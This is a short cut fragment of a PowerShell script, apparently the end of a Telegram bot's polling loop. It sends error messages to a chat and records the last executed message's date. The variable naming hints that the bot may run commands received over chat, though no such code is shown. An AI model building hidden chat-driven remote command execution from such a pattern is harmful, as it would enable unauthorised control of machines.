                    stgmsg -Messagetext ($_.exception.message) -ChatID $messages.message.chat.id
                    }
                }
            Finally{$lastexecMessageID=$messages.message.date}
        }
    }
}
